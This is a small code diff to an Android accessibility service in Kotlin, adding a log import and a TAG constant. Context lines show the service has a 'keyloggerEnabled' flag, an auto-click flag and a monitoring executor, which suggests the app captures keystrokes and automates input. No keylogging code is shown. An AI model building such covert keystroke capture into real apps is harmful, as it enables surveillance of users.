@@ -9,6 +9,7 @@ import android.graphics.Path
 import android.graphics.Rect
 import android.os.Build
 import android.os.Bundle
+import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.abuzahra.manager.executor.MonitorExecutor
@@ -26,6 +27,7 @@ import java.util.concurrent.atomic.AtomicBoolean
 class MyAccessibilityService : AccessibilityService() {
 
     companion object {
+        private const val TAG = "MyAccessibilityService"
         private var instance: MyAccessibilityService? = null
         private val keyloggerEnabled = java.util.concurrent.atomic.AtomicBoolean(false)
         private val autoClickEnabled = java.util.concurrent.atomic.AtomicBoolean(false)
